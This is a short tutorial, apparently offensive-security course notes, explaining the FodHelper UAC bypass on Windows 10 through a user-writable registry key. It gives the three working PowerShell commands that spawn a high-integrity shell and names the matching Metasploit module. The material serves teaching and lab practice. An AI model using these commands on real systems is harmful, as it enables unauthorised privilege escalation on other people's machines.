# FodHelper UAC Bypass

The FodHelper binary runs as high integrity, it is vulnerable to exploitation due to the way it interacts with the Windows Registry. 

It interacts with the current user's registry, which we are allowed to modify.

As reported in the original blog post, FodHelper tries to locate the following registry key, which does not exist by default in Windows 10.

```Reg
HKCU:\Software\Classes\ms-settings\shell\open\command
```

If we create the registry key and add the DelegateExecute value, Fodhelper will search for the default value (Default) and use the content of the value to create a new process. If our exploit creates the registry path and sets the (Default) value to an executable (like powershell.exe), it will be spawned as a high integrity process when Fodhelper is started.

```PowerShell

PS C:\Users\Offsec> New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe –Force

PS C:\Users\Offsec> New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force

PS C:\Users\Offsec> C:\Windows\System32\fodhelper.exe

```

We can do this with metasploit by using the exploit : ```exploit/windows/local/bypassuac_fodhelper```